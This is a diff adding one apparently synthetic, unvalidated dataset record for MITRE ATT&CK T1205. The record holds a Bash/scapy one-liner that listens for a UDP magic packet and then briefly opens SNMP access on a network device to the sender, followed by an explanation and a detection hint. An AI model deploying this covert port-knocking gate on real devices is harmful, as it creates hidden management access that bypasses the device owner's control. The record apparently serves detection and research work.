@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo python3 -c 'from scapy.all import sniff,IP,UDP,Raw; import os; p=sniff(filter=\"udp dst port 62201\", lfilter=lambda x: x.haslayer(Raw) and b\"MAGIC:SNMP-OPEN\" in bytes(x[Raw].load), count=1)[0]; os.system(f\"ciscoconf --apply \\\"ip access-list extended MGMT-SNMP; permit udp host {p[IP].src} any eq 161\\\" && (sleep 300; ciscoconf --apply \\\"ip access-list extended MGMT-SNMP; no permit udp host {p[IP].src} any eq 161\\\") &\")'",
+  "explanation": "Waits for a UDP magic packet on 62201 containing MAGIC:SNMP-OPEN, then allows SNMP (UDP/161) from the sender for 5 minutes via ciscoconf. Requires sudo for sniffing.",
+  "rationale_steps": [
+    "Use scapy to sniff a specific magic string in UDP payloads (traffic signaling).",
+    "Add a temporary ACL entry to permit UDP/161 from the source IP and schedule automatic removal.",
+    "No authentication manipulation; only port gating is changed.",
+    "Detection: monitor unusual UDP traffic to 62201 and audit transient SNMP ACL changes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-7a393370-c6a4c29c",
+  "source_prompt_hash": "7a393370",
+  "timestamp_utc": "2025-09-30T06:01:37.763989Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
